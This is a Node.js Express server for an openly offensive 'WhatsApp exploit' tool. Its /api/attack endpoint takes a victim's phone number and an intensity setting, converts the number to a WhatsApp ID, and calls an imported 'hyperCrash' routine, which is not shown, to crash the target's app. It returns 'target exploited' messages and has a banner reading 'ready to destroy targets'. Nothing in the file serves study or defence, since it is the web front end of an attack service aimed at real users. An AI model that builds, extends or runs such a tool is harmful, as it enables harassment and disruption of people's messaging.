const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { hyperCrash } = require('./crashEngine');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ========== MIDDLEWARE ==========
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Stricter rate limiting for hacker tool
const limiter = rateLimit({
    windowMs: 10 * 60 * 1000,
    max: 5,
    message: { success: false, error: '⛔ Rate limit exceeded. Wait 10 minutes.' }
});
app.use('/api/attack', limiter);

// ========== PHONE FORMATTER ==========
function formatPhoneNumber(input) {
    let cleaned = input.replace(/\D/g, '');
    if (cleaned.startsWith('0')) cleaned = cleaned.substring(1);
    if (!cleaned.startsWith('254')) cleaned = '254' + cleaned;
    return cleaned + '@s.whatsapp.net';
}

// ========== ROUTES ==========
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/attack', async (req, res) => {
    let { target, intensity = 'max', useProxy = false } = req.body;

    if (!target) {
        return res.status(400).json({
            success: false,
            error: '⚠️ TARGET PHONE NUMBER REQUIRED'
        });
    }

    const originalInput = target;

    try {
        target = formatPhoneNumber(target);
    } catch (error) {
        return res.status(400).json({
            success: false,
            error: '❌ INVALID PHONE NUMBER FORMAT'
        });
    }

    const validIntensities = ['low', 'medium', 'max'];
    if (!validIntensities.includes(intensity)) {
        return res.status(400).json({
            success: false,
            error: '❌ INVALID INTENSITY LEVEL'
        });
    }

    try {
        console.log(`[💀] EXPLOIT INITIATED on ${originalInput} (${target})`);
        
        const result = await hyperCrash(target, intensity, useProxy);
        
        res.json({
            success: true,
            message: `💀 TARGET ${originalInput} HAS BEEN EXPLOITED`,
            data: {
                ...result,
                phoneNumber: originalInput,
                formattedJid: target,
                exploitId: `EXPLOIT-${Date.now().toString(36).toUpperCase()}`
            },
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error(`[❌] EXPLOIT FAILED: ${error.message}`);
        res.status(500).json({
            success: false,
            error: `💀 EXPLOIT FAILED: ${error.message}`,
            phoneNumber: originalInput
        });
    }
});

app.get('/api/status', (req, res) => {
    res.json({
        status: '🟢 ONLINE',
        tool: 'WHATSAPP EXPLOIT',
        developer: 'DEV SMILE',
        version: '3.0.0',
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        timestamp: new Date().toISOString()
    });
});

app.listen(PORT, () => {
    console.log(`
    ██████╗ ███████╗██╗   ██╗    ███████╗███╗   ███╗██╗██╗     ███████╗
    ██╔══██╗██╔════╝██║   ██║    ██╔════╝████╗ ████║██║██║     ██╔════╝
    ██║  ██║█████╗  ██║   ██║    █████╗  ██╔████╔██║██║██║     █████╗  
    ██║  ██║██╔══╝  ╚██╗ ██╔╝    ██╔══╝  ██║╚██╔╝██║██║██║     ██╔══╝  
    ██████╔╝███████╗ ╚████╔╝     ███████╗██║ ╚═╝ ██║██║███████╗███████╗
    ╚═════╝ ╚══════╝  ╚═══╝      ╚══════╝╚═╝     ╚═╝╚═╝╚══════╝╚══════╝
                                                                        
    [💀] WHATSAPP EXPLOIT v3.0
    [💀] DEVELOPER: DEV SMILE
    [💀] SERVER RUNNING ON http://localhost:${PORT}
    [💀] READY TO DESTROY TARGETS
    `);
});
